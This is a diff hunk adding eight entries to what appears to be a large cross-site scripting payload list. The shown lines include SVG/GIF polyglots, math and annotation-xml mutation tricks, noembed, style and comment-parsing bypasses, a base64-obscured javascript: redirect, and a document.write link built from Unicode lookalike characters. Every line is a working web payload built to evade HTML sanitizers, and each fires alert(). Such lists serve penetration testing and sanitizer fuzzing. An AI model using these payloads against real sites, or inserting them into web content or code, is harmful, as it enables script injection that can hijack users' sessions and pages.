@@ -1733,3 +1733,11 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <math><annotation-xml encoding="text/html"><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></math>
 <math><annotation-xml encoding="text/html"><script>&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</script></math>
 <svg/onload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;//
+<noembed><!--</noembed><img src=1 onerror=alert(1)>-->
+<script>document.write('<a href="//\u{1f136}\u{1f13e}\u{1f13e}\u{1f136}\u{1f13b}\u{1f134}\u{ff61}\u{1f132}\u{1f13e}\u{1f13c}"target=_blank>test</a>');</script>
+<svg><style>*{background:url('<![CDATA[</style></svg><img title=');]]>]]></style></svg><iframe onload=alert(1)>'>
+<style><!--</style><img src=1 onerror=alert(1)>-->
+<!---><img src=1 onerror=alert(1)> -->
+<!----!><img src=1 onerror=alert(2)> -->
+<!--><img src=1 onerror=alert(3)> -->
+<img ="=" title="><img src=1 onerror=alert(1)>">
